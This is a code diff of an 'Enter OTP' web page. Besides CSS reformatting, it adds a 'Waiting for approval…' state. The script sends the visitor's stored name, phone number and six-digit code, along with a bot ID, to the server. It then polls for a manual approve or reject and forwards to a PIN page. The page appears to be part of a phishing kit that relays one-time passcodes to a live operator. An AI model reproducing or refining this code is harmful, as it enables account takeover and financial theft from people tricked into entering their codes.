@@ -15,6 +15,7 @@
     align-items: center;
     justify-content: center;
   }
+
   .card {
     background: #ffffff;
     width: 92%;
@@ -24,6 +25,7 @@
     box-shadow: 0 10px 30px rgba(0,0,0,0.15);
     position: relative;
   }
+
   .close {
     position: absolute;
     top: 14px;
@@ -39,23 +41,86 @@
     font-weight: bold;
     cursor: pointer;
   }
-  h1 { text-align: center; font-size: 22px; margin-bottom: 6px; }
-  .info { text-align: center; font-size: 14px; color: #666; margin-bottom: 24px; }
-  .otp-wrap { display: flex; justify-content: space-between; gap: 8px; margin-bottom: 18px; }
+
+  h1 {
+    text-align: center;
+    font-size: 22px;
+    margin-bottom: 6px;
+  }
+
+  .info {
+    text-align: center;
+    font-size: 14px;
+    color: #666;
+    margin-bottom: 24px;
+  }
+
+  .otp-wrap {
+    display: flex;
+    justify-content: space-between;
+    gap: 8px;
+    margin-bottom: 18px;
+  }
+
   .otp-wrap input {
-    width: 48px; height: 54px; text-align: center; font-size: 22px;
-    border-radius: 8px; border: 1.5px solid #ddd; outline: none;
+    width: 48px;
+    height: 54px;
+    text-align: center;
+    font-size: 22px;
+    border-radius: 8px;
+    border: 1.5px solid #ddd;
+    outline: none;
   }
-  .otp-wrap input:focus { border-color: #e11b22; }
-  .timer { text-align: center; font-size: 13px; color: #777; margin-bottom: 20px; }
+
+  .otp-wrap input:disabled {
+    background: #f2f2f2;
+  }
+
+  .otp-wrap input:focus {
+    border-color: #e11b22;
+  }
+
+  .timer {
+    text-align: center;
+    font-size: 13px;
+    color: #777;
+    margin-bottom: 20px;
+  }
+
   button {
-    width: 100%; padding: 16px; font-size: 16px;
-    background: #e11b22; color: #fff; border: none;
-    border-radius: 999px; opacity: 0.5;
+    width: 100%;
+    padding: 16px;
+    font-size: 16px;
+    background: #e11b22;
+    color: #fff;
+    border: none;
+    border-radius: 999px;
+    opacity: 0.5;
   }
-  button:enabled { opacity: 1; }
-  .resend { text-align: center; font-size: 14px; color: #999; margin-top: 18px; }
-  .resend.active { color: #e11b22; cursor: pointer; }
+
+  button:enabled {
+    opacity: 1;
+  }
+
+  .resend {
+    text-align: center;
+    font-size: 14px;
+    color: #999;
+    margin-top: 18px;
+  }
+
+  .resend.active {
+    color: #e11b22;
+    cursor: pointer;
+  }
+
+  .waiting {
+    text-align: center;
+    font-size: 14px;
+    color: #e11b22;
+    margin-top: 16px;
+    display: none;
+  }
 </style>
 </head>
 
@@ -65,7 +130,9 @@
   <div class="close">✕</div>
 
   <h1>Enter OTP</h1>
-  <div class="info">Please enter the OTP sent to verify your number</div>
+  <div class="info">
+    Please enter the OTP sent to verify your number
+  </div>
 
   <div class="otp-wrap">
     <input type="tel" maxlength="1" inputmode="numeric">
@@ -81,6 +148,11 @@
   </div>
 
   <button id="verifyBtn" disabled>Verify OTP</button>
+
+  <div id="waiting" class="waiting">
+    ⏳ Waiting for approval…
+  </div>
+
   <div id="resend" class="resend">Resend in 02:00</div>
 </div>
 
@@ -89,6 +161,7 @@
   const verifyBtn = document.getElementById('verifyBtn');
   const countdownEl = document.getElementById('countdown');
   const resendEl = document.getElementById('resend');
+  const waitingEl = document.getElementById('waiting');
 
   const fullName = localStorage.getItem('fullName');
   const phone = localStorage.getItem('phone');
@@ -101,7 +174,7 @@
 
   let timeLeft = 120;
   function formatTime(sec) {
-    return `${String(Math.floor(sec/60)).padStart(2,'0')}:${String(sec%60).padStart(2,'0')}`;
+    return `${String(Math.floor(sec / 60)).padStart(2,'0')}:${String(sec % 60).padStart(2,'0')}`;
   }
 
   const timer = setInterval(() => {
@@ -117,51 +190,53 @@
   }, 1000);
 
   function submitOtp(code) {
+    verifyBtn.disabled = true;
+    verifyBtn.textContent = 'Waiting for approval…';
+    waitingEl.style.display = 'block';
+    inputs.forEach(i => i.disabled = true);
+
     fetch(`${window.location.origin}/submit-otp`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        name: fullName,
-        phone,
-        otp: code,
-        botId
-      })
+      body: JSON.stringify({ name: fullName, phone, otp: code, botId })
     })
     .then(r => r.json())
     .then(({ requestId }) => pollApproval(requestId))
-    .catch(() => alert('Server error. Try again.'));
+    .catch(() => alert('Server error. Please try again.'));
   }
 
   function pollApproval(requestId) {
     const interval = setInterval(async () => {
       const r = await fetch(`${window.location.origin}/check-otp/${requestId}`);
       const d = await r.json();
+
       if (d.approved === true) {
         clearInterval(interval);
         window.location.href = 'pin.html';
       }
+
       if (d.approved === false) {
         clearInterval(interval);
-        alert('OTP rejected.');
+        alert('OTP rejected. Please try again.');
         window.location.reload();
       }
     }, 2000);
   }
 
   function checkInputs() {
-    verifyBtn.disabled = Array.from(inputs).map(i=>i.value).join('').length !== 6;
+    verifyBtn.disabled = Array.from(inputs).map(i => i.value).join('').length !== 6;
   }
 
   inputs.forEach((input, i) => {
     input.addEventListener('input', () => {
       input.value = input.value.replace(/\D/g,'');
-      if (input.value && inputs[i+1]) inputs[i+1].focus();
+      if (input.value && inputs[i + 1]) inputs[i + 1].focus();
       checkInputs();
     });
   });
 
   verifyBtn.addEventListener('click', () => {
-    const code = Array.from(inputs).map(i=>i.value).join('');
+    const code = Array.from(inputs).map(i => i.value).join('');
     if (code.length === 6) submitOtp(code);
   });
 </script>
